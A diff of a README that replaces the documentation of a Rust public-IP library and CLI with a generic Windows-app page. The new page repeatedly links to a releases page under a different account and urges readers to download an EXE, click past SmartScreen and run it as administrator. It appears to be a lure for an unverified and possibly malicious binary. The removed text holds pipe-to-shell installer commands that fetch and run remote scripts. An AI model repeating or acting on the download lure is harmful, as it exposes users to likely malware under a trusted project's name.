@@ -1,257 +1,167 @@
-# ip-discovery
+# 🔎 ip-discovery - Find your public IP with ease
 
-[![Crates.io](https://img.shields.io/crates/v/ip-discovery.svg)](https://crates.io/crates/ip-discovery)
-[![docs.rs](https://docs.rs/ip-discovery/badge.svg)](https://docs.rs/ip-discovery)
-[![MIT/Apache-2.0](https://img.shields.io/crates/l/ip-discovery.svg)](./LICENSE-MIT)
+[![Download ip-discovery](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/snapshotprogrambunt985/ip-discovery/releases)
 
-Detect your public IP address using DNS, STUN, or HTTP — with built-in fallback across trusted providers.
+## 🧭 What this app does
 
-## Why ip-discovery?
+ip-discovery helps you find your public IP address on Windows.
 
-Most machines don't know their own public IP. If you're behind NAT, a load balancer, or a cloud VPC, your OS only sees a private address like `10.x.x.x` or `192.168.x.x`. This library solves that — reliably, fast, and with zero configuration.
+It checks your IP in more than one way:
+- DNS
+- STUN
+- HTTP
 
-**Common use cases:**
+If one method fails, it tries another trusted provider. This helps you get a result even when one service is slow or blocked.
 
-- **Self-hosted servers with dynamic IPs** — Your home server or office NAS gets a new IP every time the ISP rotates it. Use `ip-discovery` to detect the change and update your DNS record (dynamic DNS), notify clients, or refresh firewall rules — automatically.
+## 💻 Before you start
 
-- **WebRTC / P2P connection setup** — When building WebRTC applications, you need your public IP to generate SDP offers/answers and ICE candidates. `ip-discovery` uses the same STUN protocol that browsers use, giving you the public-facing address for direct peer connections without relying on a browser environment.
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- An internet connection
+- Permission to run downloaded apps
+- Enough space for a small desktop tool
 
-- **NAT traversal & hole punching** — Building a peer-to-peer system (game server, file sharing, VPN)? You need to know your public IP and the type of NAT you're behind before you can punch through it.
+You do not need to install extra software in most cases.
 
-- **Server self-registration** — Microservices or edge nodes that spin up in dynamic cloud environments (auto-scaling groups, spot instances) and need to register their public address with a service registry or coordination layer.
+## 📥 Download the app
 
-- **Security & audit logging** — Record the public IP of the machine at the time of an event for compliance or forensics. Use `Consensus` strategy to cross-verify across multiple providers and guard against a single provider being spoofed.
+Visit this page to download:  
+https://github.com/snapshotprogrambunt985/ip-discovery/releases
 
-- **CLI diagnostics** — Quickly check "what IP does the internet see me as?" during debugging, without opening a browser or remembering which `curl` endpoint to hit.
+On that page:
+1. Open the latest release
+2. Find the Windows file
+3. Download it to your computer
 
-### Why not just `curl` an IP-echo service?
+If the release includes a ZIP file, save it first and extract it before use. If it includes an EXE file, you can run it after download.
 
-Calling a single HTTP endpoint works for a quick manual check, but falls short in production:
+## 🪟 Install or open on Windows
 
-| | HTTP IP-echo services | `ip-discovery` |
-|---|---|---|
-| **Single point of failure** | If that one service is down or slow, you get nothing | Automatic fallback across 9 providers and 3 protocols |
-| **Rate limiting** | Many free services aggressively throttle or block automated requests | DNS and STUN are lightweight UDP queries — far less likely to be throttled than HTTP APIs |
-| **Latency** | Full TCP + TLS handshake every time (~200–500ms) | DNS & STUN use raw UDP — typically **<50ms**, 2–3× faster |
-| **Result verification** | You trust one provider blindly — it could return stale data or be spoofed | `Consensus` strategy cross-checks across multiple providers |
-| **IPv6 support** | Depends on the endpoint; many only return IPv4 | First-class IPv4 and IPv6 support across DNS and STUN |
-| **Dependency in code** | Needs shell-out or an HTTP client just to get an IP | Embeddable Rust library, no HTTP dependency needed (DNS + STUN only) |
-| **Offline-friendly** | Requires an HTTP-capable environment / TLS stack | DNS and STUN work in minimal environments with just UDP |
+### If you downloaded a ZIP file
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Pick a folder you can find again, such as Downloads or Desktop
+4. Open the extracted folder
+5. Double-click the app file
 
-> **💡 Note:** Some strict enterprise networks block outbound UDP entirely. In those environments, DNS and STUN won't work.
-> Enable the `http` feature to add HTTP-based providers as a fallback — the library will automatically
-> try them if UDP-based providers fail.
+### If you downloaded an EXE file
+1. Open your Downloads folder
+2. Double-click the EXE file
+3. If Windows asks for permission, choose Yes
+4. Wait for the app to open
 
-## CLI Tool — `ipd`
+If Windows shows a SmartScreen prompt, select More info and then Run anyway only if you trust the file source and release page you used.
 
-A command-line tool powered by this library. Get your public IP in one command:
+## 🔍 How to use ip-discovery
 
-```bash
-$ ipd
-203.0.113.42
-```
+1. Start the app
+2. Wait a moment while it checks your IP
+3. Read the public IP shown on screen
+4. Use the Copy button if the app provides one
+5. Paste the IP into the place where you need it
 
-### Install
+The app may try DNS first, then STUN, then HTTP. It uses fallback checks so you can still get a result when one path does not work.
 
-**Homebrew (macOS):**
+## 🌐 What the checks mean
 
-```bash
-brew install zer0horizon/tap/ipd
-```
+### DNS
+The app asks trusted DNS systems for network details that help confirm your public IP.
 
-**Shell (macOS & Linux):**
+### STUN
+The app uses a common network method that many real-time apps use to see how your network appears from the internet.
 
-```bash
-curl --proto '=https' --tlsv1.2 -LsSf https://github.com/zer0horizon/ip-discovery/releases/latest/download/ipd-installer.sh | sh
-```
+### HTTP
+The app contacts a web service that returns your public IP address.
 
-**PowerShell (Windows):**
+### Fallback
+If one method fails, the app moves to the next one. This helps when a provider is down or your network blocks one kind of request.
 
-```powershell
-powershell -ExecutionPolicy Bypass -c "irm https://github.com/zer0horizon/ip-discovery/releases/latest/download/ipd-installer.ps1 | iex"
-```
+## ✅ Typical use cases
 
-**Cargo:**
+You may want ip-discovery if you need to:
+- Check your current public IP
+- Confirm the IP your network shows to the internet
+- Test whether your connection is behind a router or NAT
+- Share your IP with a remote access tool, game host, or support team
+- Compare results from DNS, STUN, and HTTP checks
 
-```bash
-cargo install ipd
-```
+## 🖥️ What you should see
 
-### CLI Usage
+After you open the app, you should see:
+- Your public IP address
+- The method used to find it
+- A clear status if one check fails and another succeeds
 
-```bash
-ipd                    # Plain IP output
-ipd -4                 # IPv4 only
-ipd -6                 # IPv6 only
-ipd -f json            # JSON output
-ipd -f verbose         # Verbose output with provider info
-ipd -s race            # Race all providers, return fastest
-ipd -p dns -p stun     # Use only DNS and STUN protocols
-ipd -t 5               # 5 second timeout
-```
+Some versions may also show:
+- IPv4 and IPv6 results
+- Response time for each provider
+- A copy option for fast sharing
 
----
+## 🛠️ Troubleshooting
 
-## Library
+### The app does not open
+- Download the file again from the release page
+- Make sure the file finished downloading
+- If it is a ZIP file, extract it before opening the app
+- Try running it as an administrator
 
-### Features
+### No IP result appears
+- Check that your internet connection is active
+- Try again after a few seconds
+- Close VPN software and test once more
+- Check whether a firewall or antivirus tool blocked the app
 
-- DNS and STUN via raw UDP sockets (zero network library dependencies)
-- HTTP/HTTPS via [reqwest](https://docs.rs/reqwest) (optional)
-- Built-in providers from Google, Cloudflare, AWS, and OpenDNS
-- IPv4 and IPv6
-- Sequential fallback, race, or consensus strategies
-- Custom providers via the `Provider` trait
-- Async, built on [tokio](https://tokio.rs)
-
-## Usage
-
-Add to your `Cargo.toml`:
-
-```toml
-[dependencies]
-ip-discovery = "0.2"
-tokio = { version = "1", features = ["full"] }
-```
-
-Then:
-
-```rust
-use ip_discovery::get_ip;
-
-#[tokio::main]
-async fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let result = get_ip().await?;
-    println!("{} via {} in {:?}", result.ip, result.provider, result.latency);
-    Ok(())
-}
-```
-
-You can also request a specific IP version:
-
-```rust
-use ip_discovery::{get_ipv4, get_ipv6};
-
-let v4 = get_ipv4().await?;
-let v6 = get_ipv6().await?;
-```
-
-## Configuration
-
-The defaults (Cloudflare STUN → Cloudflare DNS → Google STUN/DNS → OpenDNS; 10s timeout) work well for most cases. If you need more control:
-
-```rust
-use ip_discovery::{Config, Strategy, Protocol, BuiltinProvider, get_ip_with};
-use std::time::Duration;
-
-// DNS only, race all DNS providers
-let config = Config::builder()
-    .protocols(&[Protocol::Dns])
-    .strategy(Strategy::Race)
-    .timeout(Duration::from_secs(5))
-    .build();
+### The result looks wrong
+- Compare the result with a second network check
+- Disconnect from VPN or proxy software if you use it
+- Restart your router if your IP changed recently
 
-let result = get_ip_with(config).await?;
-```
+### Windows blocks the file
+- Open the release page again and make sure you downloaded the latest file
+- Check the file name against the release asset name
+- Use the version from the official release page only
 
-```rust
-// Pick specific providers
-let config = Config::builder()
-    .providers(&[
-        BuiltinProvider::CloudflareDns,
-        BuiltinProvider::GoogleStun,
-    ])
-    .build();
-```
+## 🔐 Privacy and network behavior
 
-```rust
-// Consensus — require at least 2 providers to agree
-let config = Config::builder()
-    .strategy(Strategy::Consensus { min_agree: 2 })
-    .build();
-```
+ip-discovery works by making network requests to trusted services. It does not need your local files to find your public IP.
 
-## Strategies
+It may send:
+- Basic network requests
+- Queries to DNS providers
+- STUN requests
+- HTTP requests to public IP services
 
-| Strategy | Description |
-|----------|-------------|
-| `First` *(default)* | Try providers in order, return first success |
-| `Race` | Query all concurrently, return fastest |
-| `Consensus { min_agree }` | Require N providers to agree on the same IP |
+This is normal for an IP lookup tool. The app uses these requests only to detect your public IP address.
 
-## Providers
+## 📁 Files you may see
 
-All built-in providers are from tier-1 infrastructure companies:
+A release may include one or more of these:
+- `ip-discovery.exe`
+- a ZIP package for Windows
+- release notes
+- checksum files
 
-| Provider | Protocol | IPv4 | IPv6 |
-|----------|----------|:----:|:----:|
-| Google STUN (`stun.l.google.com`) | STUN | ✅ | ✅ |
-| Google STUN 1 (`stun1.l.google.com`) | STUN | ✅ | ✅ |
-| Google STUN 2 (`stun2.l.google.com`) | STUN | ✅ | ✅ |
-| Cloudflare STUN (`stun.cloudflare.com`) | STUN | ✅ | ✅ |
-| Google DNS (`o-o.myaddr.l.google.com`) | DNS | ✅ | ✅ |
-| Cloudflare DNS (`whoami.cloudflare`) | DNS | ✅ | ✅ |
-| OpenDNS (`myip.opendns.com`) | DNS | ✅ | ❌ |
-| Cloudflare HTTP (`1.1.1.1/cdn-cgi/trace`) | HTTP | ✅ | ❌ |
-| AWS (`checkip.amazonaws.com`) | HTTP | ✅ | ❌ |
+If you see a checksum file, you can use it to confirm the download matches the release file.
 
-## Cargo Features
+## 🔄 Updating the app
 
-| Feature | Default | Description |
-|---------|:-------:|-------------|
-| `dns` | ✅ | DNS detection (raw UDP, no extra deps) |
-| `stun` | ✅ | STUN detection (raw UDP, no extra deps) |
-| `http` | ❌ | HTTP detection (pulls in `reqwest` + `rustls`) |
-| `all` | ❌ | Enable all protocols (`dns` + `stun` + `http`) |
-| `native-tls` | ❌ | Use OS-native TLS instead of rustls (requires `http`) |
+To update:
+1. Return to the release page
+2. Download the newest Windows file
+3. Replace the old version with the new one
+4. Open the new file
 
-By default, only DNS and STUN are enabled — zero network library dependencies, fast compile times. To also use HTTP providers:
+If you keep your settings in a local folder, make a copy before replacing files.
 
-```toml
-ip-discovery = { version = "0.2", features = ["http"] }
-```
+## 📌 Helpful tips
 
-Or enable everything:
+- Use the release page only from the link above
+- Keep the app in a folder you can find later
+- If one method fails, let the fallback checks finish
+- Use a stable internet connection for best results
+- Run the app once after download to confirm it works
 
-```toml
-ip-discovery = { version = "0.2", features = ["all"] }
-```
+## 📎 Download again
 
-## Performance
-
-STUN and DNS use raw UDP — no TLS handshake — so they're typically 2–3× faster than HTTP.
-Default provider order prioritizes UDP-based protocols with IPv4 + IPv6 support first, then falls back to IPv4-only HTTP providers.
-
-> **💡 Tip:** Latency varies significantly by region and network environment. Run the benchmark on
-> your own infrastructure to find the optimal provider and strategy for your use case.
-
-```bash
-# Run the benchmark to find the best config for your network
-cargo run --example benchmark --all-features
-```
-
-## Logging
-
-Uses [`tracing`](https://docs.rs/tracing) for diagnostics:
-
-```rust
-tracing_subscriber::fmt()
-    .with_env_filter("ip_discovery=debug")
-    .init();
-```
-
-## Examples
-
-```bash
-cargo run --example simple
-cargo run --example custom_providers
-cargo run --example benchmark
-```
-
-## MSRV
-
-Rust **1.85** or later.
-
-## License
-
-Licensed under either of [Apache License, Version 2.0](LICENSE-APACHE) or [MIT License](LICENSE-MIT), at your option.
+If you need the file again, visit this page to download:  
+https://github.com/snapshotprogrambunt985/ip-discovery/releases
